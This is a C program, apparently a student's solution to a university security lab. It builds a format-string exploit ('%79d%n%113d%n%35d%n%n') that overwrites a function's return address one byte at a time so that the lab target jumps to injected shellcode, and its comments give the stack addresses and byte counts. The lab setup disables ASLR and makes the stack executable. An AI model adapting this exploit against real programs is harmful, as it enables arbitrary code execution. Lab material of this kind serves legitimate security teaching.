#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/personality.h>

/* Change to shellcode.h if you want a shell */
#include "checkcode.h"
#define TARGET "../targets/target6"
#define BUFLEN 352

int main(void)
{
  /* Setup code to make sure your target runs without ASLR and has an
     executable stack. Don't change this.*/
  personality(ADDR_NO_RANDOMIZE |READ_IMPLIES_EXEC);

  char *args[3];
  char *env[1];
  
  // buf address: 0xffffdb6c
  // return address of foo: 0xffffdcd0

  char buf[BUFLEN] = {0};
  memset(buf, 0x90, BUFLEN-1);

  // To overwrite least significant byte of return address (4th byte)
  *(unsigned long *)(buf) = 0xAAAAAAAA; // padding
  *(unsigned long *)(buf+4) = 0xffffdcd0; // address

  // To overwrite second least significant byte of return address (3rd byte)
  *(unsigned long *)(buf+8) = 0xAAAAAAAA;
  *(unsigned long *)(buf+12) = 0xffffdcd1;

  // To overwrite second most significant byte of return address (2nd byte)
  *(unsigned long *)(buf+16) = 0xAAAAAAAA;
  *(unsigned long *)(buf+20) = 0xffffdcd2;

  // To overwrite most significant byte of return address (1st byte)
  *(unsigned long *)(buf+24) = 0xffffdcd3;

  // Attack address: &buf + 255 = 0xffffdc6b -> needs to be written into return address of foo

  // We have written 28 bytes so far
  // Least significant byte of 0xffffdc6b = 0x6b
  // 0x6b = 107 -> 107 - 28 = 79 bytes to write (%79d%n)

  // We have now written 107 bytes so far
  // Second least significant byte of 0xffffdc6b = 0xdc
  // 0xdc = 220 -> 220 - 107 = 113 bytes to write (%113d%n)

  // We have now written 220 bytes so far
  // Second most significant byte of 0xffffdc6b = 0xff
  // 0xff = 255 -> 255 - 220 = 35 bytes to write (%35d%n)

  // We have now written 255 bytes so far
  // Most significant byte of 0xffffdc6b = 0xff
  // 0xff = 255 -> 255 - 255 = 0 bytes to write (%n)

  char str[] = "%79d%n%113d%n%35d%n%n";

  memcpy(buf+28, str, sizeof(str)-1);
  memcpy(buf+28+strlen(str), shellcode, sizeof(shellcode)-1);

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    perror("execve failed");

  return 0;
}
